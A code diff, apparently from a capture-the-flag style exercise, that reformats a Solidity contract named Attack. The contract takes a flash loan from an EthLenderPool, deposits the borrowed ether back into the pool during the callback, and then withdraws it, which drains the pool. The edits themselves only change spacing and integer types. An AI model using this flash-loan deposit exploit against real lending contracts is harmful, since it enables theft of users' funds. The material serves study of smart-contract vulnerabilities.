@@ -3,14 +3,14 @@ pragma solidity ^0.8.10;
 
 import "./EthLenderPool.sol";
 
-contract Attack is IFlashLoanEtherReceiver{
+contract Attack is IFlashLoanEtherReceiver {
     EthLenderPool pool;
 
     constructor(address _pool) {
         pool = EthLenderPool(_pool);
     }
 
-    function attack(uint amount) public {
+    function attack(uint256 amount) public {
         pool.flashLoan(amount);
         pool.withdraw();
     }
@@ -19,5 +19,5 @@ contract Attack is IFlashLoanEtherReceiver{
         pool.deposit{value: msg.value}();
     }
 
-    receive() external payable { }
+    receive() external payable {}
 }
